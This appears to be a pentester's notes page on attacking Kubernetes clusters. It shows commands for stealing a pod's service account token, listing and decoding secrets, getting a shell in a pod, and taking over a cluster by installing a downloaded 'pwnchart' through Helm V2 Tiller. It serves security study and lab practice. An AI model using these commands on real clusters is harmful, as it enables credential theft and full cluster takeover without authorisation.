---
description: >-
  Container Orchestration for managing big scalable infrastructure of
  containerized applications
---

# Kubernetes

{% embed url="https://kubernetes.io/docs/reference/glossary/?fundamental=true" %}
Description of many common terminology in the Kubernetes world
{% endembed %}

The way of attacking a Kubernetes cluster is similar to attacking Windows Active Directory:

1. Find a **vulnerability** in an application (RCE, SSRF, SSH, etc.)
2. Perform **Lateral Movement** to access more pods and nodes with higher privileges
3. Reach the **Highest Privileges** to do anything an attacker wants

## Initial Access

The `/var/run/secrets/kubernetes.io/serviceaccount/token` file (sometimes `/run` instead of `/var/run`) on a Kubernetes pod contains a Service Account Token in the form of a [JSON Web Token](https://jwt.io/). It can be decoded, and the payload tells you exactly who or what the account belongs to:

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption><p>Decoded k8 Service Account Token (<a href="https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d">source</a>)</p></figcaption></figure>

This token can be used for **Lateral Movement** in the rest of the cluster and interact with the API server, and due to being in the internal network, a lot more servers are now accessible. A few useful endpoints are:

* `/api/v1/namespaces/default/pods/`: List all pods
* `/api/v1/namespaces/default/secrets/`: List all secrets

These can be requested with the found Service Account Token (JWT) as a header:

```bash
curl -v -H 'Authorization: Bearer <TOKEN>' https://<API_SERVER>/...
```

If the machine has `kubectl` installed (or you download a [static binary](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)), it is also possible to simply use it instead of manual `curl` commands. Some similar and useful commands are:

<pre class="language-shell-session"><code class="lang-shell-session"># # List everything
<strong>$ kubectl get all --token $TOKEN --server $API_SERVER --insecure-skip-tls-verify
</strong><strong>$ kubectl get pods     # List pods
</strong><strong>$ kubectl get secrets  # List secrets
</strong>
# # Execute an interactive shell with a pod
<strong>$ kubectl exec &#x3C;POD_NAME> --stdin --tty  -- /bin/bash
</strong># # Get and decode a secret
<strong>$ kubectl get secret &#x3C;SECRET_NAME> -o jsonpath='{.data.*}' | base64 -d
</strong></code></pre>

## Helm V2 - Tiller

At the time of writing, [Helm](https://helm.sh/) V3 is the newest version, but many clusters still use the outdated V2. This bears some serious security considerations as the Tiller component has full cluster administration RBAC privileges, which can be exploited if we have access to `helm`.&#x20;

Taken from [here](https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-9/helm-v2-tiller-to-pwn-kubernetes-cluster-takeover/welcome), you can test the TCP connection on port `44134` and verify the version:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ nc -v tiller-deploy.kube-system 44134
</strong>Connection to tiller-deploy.kube-system 44134 port [tcp/*] succeeded!
<strong>$ helm version
</strong>Client: &#x26;version.Version{SemVer:"v2.0.0", GitCommit:"ff52399e51bb880526e9cd0ed8386f6433b74da1", GitTreeState:"clean"}
Server: &#x26;version.Version{SemVer:"v2.0.0", GitCommit:"b0c113dfb9f612a9add796549da66c0d294508a3", GitTreeState:"clean"}
</code></pre>

To start exploiting this, a ready-to-use template exists that requires some minimal changes:

{% embed url="https://github.com/Ruil1n/helm-tiller-pwn" %}

```shell-session
$ curl -o ./pwnchart.tgz https://github.com/Ruil1n/helm-tiller-pwn/raw/main/pwnchart-0.1.0.tgz
$ tar xvf ./pwnchart.tgz
```

Inside the newly created `./pwnchart` folder there the two `clusterrole.yaml` and `clusterrolebiniding.yaml` files in the `templates/` folder require the following change:

{% code title="templates/*.yaml" %}
```diff
- apiVersion: rbac.authorization.k8s.io/v1beta1
+ apiVersion: rbac.authorization.k8s.io/v1
```
{% endcode %}

As well as the `values.yml` file where the `name:` key needs to be changed to the **name of the service account token** which will gain all privileges. Make sure this is a service account you own:

```diff
- name: default
+ name: compromised-user
```

Finally, after setting this up you can run the command to install it:

```bash
helm --host tiller-deploy.kube-system:44134 install --name pwnchart ./pwnchart
```

After doing so, the `compromised-user` token will have every permission on the cluster and can access anything. Check `kubectl get all` for a list of everything.&#x20;
